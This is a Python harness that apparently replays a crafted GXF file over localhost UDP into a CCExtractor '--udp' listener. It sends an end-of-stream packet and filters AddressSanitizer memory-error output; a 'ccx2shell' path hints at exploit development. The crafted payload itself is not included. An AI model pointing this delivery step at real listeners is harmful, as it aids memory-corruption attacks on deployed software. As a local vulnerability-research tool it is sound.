#!/usr/bin/env python3
"""W9 local-only wire replay: feed a crafted GXF to CCExtractor's --udp listener.

Starts a lab binary bound to 127.0.0.1, sends the file in paced 8192-byte
UDP datagrams, then sends a GXF EOS packet. Captures the child's combined
stdout/stderr and prints the result. No external address is contacted.
"""
import argparse
import os
import pathlib
import socket
import struct
import subprocess
import time


def eos_packet() -> bytes:
    header = b"\x00\x00\x00\x00\x01\xfb" + struct.pack(">I", 32)
    return header + b"\x00\x00\x00\x00\xe1\xe2" + b"\x41" * 16


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("input", type=pathlib.Path)
    ap.add_argument("binary", type=pathlib.Path)
    ap.add_argument("--port", type=int, required=True)
    ap.add_argument("--out", type=pathlib.Path, required=True)
    ap.add_argument("--pace", type=float, default=0.004)
    ap.add_argument("--capture", type=pathlib.Path)
    args = ap.parse_args()

    env = dict(os.environ)
    env["LD_LIBRARY_PATH"] = "/tmp/ccx2shell-deps/root/usr/lib/x86_64-linux-gnu"
    env.setdefault("ASAN_OPTIONS", "detect_leaks=0:halt_on_error=0")
    proc = subprocess.Popen(
        [str(args.binary), "--udp", f"127.0.0.1:{args.port}", "-o", str(args.out)],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env,
    )
    time.sleep(1.5)
    if proc.poll() is not None:
        raise SystemExit(f"target exited early rc={proc.returncode}")
    data = args.input.read_bytes()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
    for offset in range(0, len(data), 8192):
        sock.sendto(data[offset:offset + 8192], ("127.0.0.1", args.port))
        time.sleep(args.pace)
    for _ in range(3):
        sock.sendto(eos_packet(), ("127.0.0.1", args.port))
        time.sleep(0.02)
    sock.close()
    try:
        raw = proc.communicate(timeout=30)[0]
    except subprocess.TimeoutExpired:
        proc.kill()
        raw = proc.communicate()[0]
    text = raw.decode(errors="replace")
    if args.capture:
        args.capture.write_text(text)
    print(f"input={args.input.name} bytes={len(data)} rc={proc.returncode} "
          f"datagrams={(len(data) + 8191) // 8192} capture={args.capture or '-'}")
    for line in text.splitlines():
        if any(key in line for key in ("ERROR: AddressSanitizer", "WRITE of size",
                                       "READ of size", "SUMMARY:", "GXF:",
                                       "No captions")):
            print(line[:200])


if __name__ == "__main__":
    main()
